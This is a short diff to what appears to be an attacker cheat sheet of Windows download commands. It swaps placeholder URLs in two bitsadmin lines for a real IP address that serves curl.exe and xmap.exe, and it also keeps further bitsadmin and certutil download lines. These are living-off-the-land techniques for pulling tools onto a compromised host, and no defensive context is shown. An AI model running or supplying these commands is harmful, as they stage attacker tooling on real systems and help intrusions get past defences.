@@ -1,6 +1,6 @@
 
-bitsadmin /rawreturn /transfer getfile http://url/demo.txt c:\demo.txt
-bitsadmin /rawreturn /transfer getpayload http://url/demo.jpg c:\demo.jpg
+bitsadmin /rawreturn /transfer getfile http://149.28.19.39/curl.exe c:\curl.exe
+bitsadmin /rawreturn /transfer getpayload http://149.28.19.39/xmap.exe c:\xmap.exe
 bitsadmin /transfer mJob /download "http://url/demo.mp3" "c:\demo.mp3"
  
 certutil.exe -urlcache *
